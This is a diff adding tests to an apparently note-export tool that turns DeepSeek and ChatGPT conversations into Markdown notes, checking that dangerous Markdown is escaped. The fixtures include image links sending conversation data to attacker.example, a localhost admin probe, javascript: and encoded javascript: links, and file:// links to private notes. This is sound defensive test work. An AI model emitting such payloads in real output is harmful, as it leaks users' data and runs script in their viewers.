@@ -1177,6 +1177,113 @@ describe('conversationToNote', () => {
     expect(note.body).not.toContain('\\*\\*Bold answer\\*\\*');
   });
 
+  it('neutralizes active DeepSeek API Markdown outside literal code', () => {
+    const markdown = [
+      '**Bold answer** with [public docs](https://example.com/docs?q=1)',
+      '![track](https://attacker.example/pixel?conversation=secret)',
+      '![probe](http://127.0.0.1:43199/admin)',
+      '[unsafe](javascript:alert%281%29)',
+      '[encoded](java&#x73;cript:alert%281%29)',
+      '[local](../private-note.md)',
+      '[[Sensitive Local Note]] and ![[Sensitive Local Note]]',
+      '![reference image][pixel]',
+      '',
+      '[pixel]: https://attacker.example/pixel',
+      '[dangerous-reference]: file:///private/note.md',
+      '',
+      '```markdown',
+      '![literal example](https://attacker.example/in-code)',
+      '[[literal wiki syntax]]',
+      '```',
+      '`![literal inline](http://127.0.0.1/private)`',
+    ].join('\n');
+    const note = conversationToNote(
+      {
+        ...mockData,
+        source: 'deepseek',
+        messages: [
+          { id: 'msg1', role: 'user', content: 'Question', index: 0 },
+          {
+            id: 'msg2',
+            role: 'assistant',
+            content: markdown,
+            contentFormat: 'markdown',
+            index: 1,
+          },
+        ],
+      },
+      defaultOptions
+    );
+
+    expect(note.body).toContain('[public docs](https://example.com/docs?q=1)');
+    expect(note.body).toContain(
+      '&#33;&#91;track](https://attacker.example/pixel?conversation=secret)'
+    );
+    expect(note.body).toContain('&#33;&#91;probe](http://127.0.0.1:43199/admin)');
+    expect(note.body).toContain('&#91;unsafe](javascript:alert%281%29)');
+    expect(note.body).toContain('&#91;encoded](java&#x73;cript:alert%281%29)');
+    expect(note.body).toContain('&#91;local](../private-note.md)');
+    expect(note.body).toContain('&#91;[Sensitive Local Note]]');
+    expect(note.body).toContain('&#33;&#91;[Sensitive Local Note]]');
+    expect(note.body).toContain('&#33;&#91;reference image][pixel]');
+    expect(note.body).toContain('&#91;dangerous-reference]: file:///private/note.md');
+    expect(note.body).toContain('![literal example](https://attacker.example/in-code)');
+    expect(note.body).toContain('[[literal wiki syntax]]');
+    expect(note.body).toContain('`![literal inline](http://127.0.0.1/private)`');
+  });
+
+  it('preserves extension-localized ChatGPT archive links', () => {
+    const localTarget = `_liska-archive/${'a'.repeat(64)}/capture-chatgpt-11111111-2222-4333-8444-555555555555/assets/${'b'.repeat(64)}.pdf`;
+    const note = conversationToNote(
+      {
+        ...mockData,
+        source: 'chatgpt',
+        messages: [
+          { id: 'msg1', role: 'user', content: 'Question', index: 0 },
+          {
+            id: 'msg2',
+            role: 'assistant',
+            content: `[verified document](${localTarget})`,
+            contentFormat: 'markdown',
+            trustedMarkdownDestinations: [localTarget],
+            index: 1,
+          },
+        ],
+      },
+      defaultOptions
+    );
+
+    expect(note.body).toContain(`[verified document](${localTarget})`);
+  });
+
+  it('neutralizes active Markdown in structured user-role records', () => {
+    const note = conversationToNote(
+      {
+        ...mockData,
+        source: 'deepseek',
+        messages: [
+          {
+            id: 'msg1',
+            role: 'user',
+            content: '![track](https://attacker.example/user-pixel) ![[Private user embed]]',
+            index: 0,
+          },
+          {
+            id: 'msg2',
+            role: 'assistant',
+            content: 'Answer',
+            contentFormat: 'markdown',
+            index: 1,
+          },
+        ],
+      },
+      defaultOptions
+    );
+
+    expect(note.body).toContain('&#33;&#91;track](https://attacker.example/user-pixel)');
+    expect(note.body).toContain('&#33;&#91;[Private user embed]]');
+  });
+
   it('keeps API tool content literal behind a collision-safe outer fence', () => {
     const note = conversationToNote(
       {
